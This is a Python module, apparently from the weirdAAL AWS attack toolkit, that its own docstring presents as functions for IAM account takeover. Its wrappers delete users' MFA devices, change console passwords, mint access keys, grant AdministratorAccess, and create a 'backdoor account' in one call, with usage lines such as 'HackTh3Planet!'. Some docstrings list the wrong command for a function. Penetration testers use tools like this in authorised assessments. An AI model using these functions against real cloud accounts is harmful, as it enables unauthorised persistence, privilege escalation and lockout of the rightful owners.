'''
Functions specifically related to IAM account takeover if you have root or IAM access gather user info,
manipulate access keys or passwords, make backdoor account
'''
from libs.aws.iam import *
from libs.aws.sts import *


def module_iam_get_account_summary():
    '''
    Get account summmary for current user get_account_summary()
    python3 weirdAAL.py -m iam_get_account_summary -t yolo
    '''
    iam_get_account_summary()


def module_iam_check_root_account():
    '''
    runs get_account_summary, list_users, for each user list_login_profiles() & list_mfa_devices()
    python3 weirdAAL.py -m iam_check_root_account -t yolo
    '''
    check_root_account()


def module_iam_get_password_policy():
    '''
    runs IAM get_account_password_policy for the current user
    python3 weirdAAL.py -m iam_get_password_policy -t yolo
    '''
    get_password_policy()


def module_iam_list_mfa_device(*text):
    '''
    List MFA device for specified user
    python3 weirdAAL.py -m iam_list_mfa_device -a python -t yolo
    '''
    iam_list_mfa_device(text[0][0])


def module_iam_delete_mfa_device(*text):
    '''
    delete specified MFA device for specified user - username,serialnum
    python3 weirdAAL.py -m iam_delete_mfa_device -a 'python','arn:aws:iam::XXXXXXXXX:mfa/python' -t yolo
    '''
    iam_delete_mfa_device(text[0][0], text[0][1])


def module_iam_change_user_console_password(*text):
    '''
    change the console password for the specified user
    python3 weirdAAL.py -m iam_change_user_console_password -a 'python','HackTh3Planet!' -t yolo
    '''
    iam_change_user_console_password(text[0][0], text[0][1])


def module_iam_create_access_key(*text):
    '''
    create an access key for specfied user
    python3 weirdAAL.py -m iam_create_access_key -a 'python' -t yolo
    '''
    iam_create_access_key(text[0][0])


def module_iam_delete_access_key(*text):
    '''
    delete the specified access key for a specified user username,accesskeyid
    python3 weirdAAL.py -m iam_delete_access_key -a 'python','AKIAEXAMPLEQ' -t yolo
    '''
    iam_delete_access_key(text[0][0], text[0][1])


def module_iam_create_user(*text):
    '''
    create a IAM user with the specified username
    python3 weirdAAL.py -m iam_delete_access_key -a 'urpwned' -t yolo
    '''
    iam_create_user(text[0][0])


def module_iam_make_admin(*text):
    '''
    attach the admin policy ['arn:aws:iam::aws:policy/AdministratorAccess'] to the specified user
    python3 weirdAAL.py -m iam_delete_access_key -a 'urpwned' -t yolo
    '''
    iam_make_admin(text[0][0])


def module_iam_make_backdoor_account(*text):
    '''
    calls the following functions:
    iam_create_user(username)
    iam_make_admin(username)
    iam_create_user_console_password(username, password)
    iam_create_access_key(username)
    python3 weirdAAL.py -m iam_make_backdoor_account -a 'secureyershit','HackTh3Planet!' -t yolo
    '''
    iam_make_backdoor_account(text[0][0], text[0][1])
